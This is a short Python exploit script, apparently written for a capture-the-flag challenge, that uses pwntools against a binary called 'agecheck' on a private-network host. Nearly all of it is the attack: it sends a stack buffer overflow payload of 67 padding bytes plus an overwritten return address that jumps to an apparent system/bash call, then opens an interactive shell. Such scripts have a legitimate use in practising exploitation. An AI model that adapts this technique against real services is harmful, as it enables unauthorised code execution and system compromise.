#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, gdb, cyclic, cyclic_find, log, p64, u64
from pwnlib.rop.rop import Gadget
LOCAL_BIN = "./agecheck"
LOCAL = False

if LOCAL:
    P = process(LOCAL_BIN)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
else:
    P = remote('10.10.4.12',3001)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
	
SYSTEM_BASH = 0x00401824 # test() after condition

rip_offset = 67
payload = b"2000/"+b"A"*rip_offset+p64(SYSTEM_BASH)

print(P.clean())
P.sendline(payload)
P.interactive()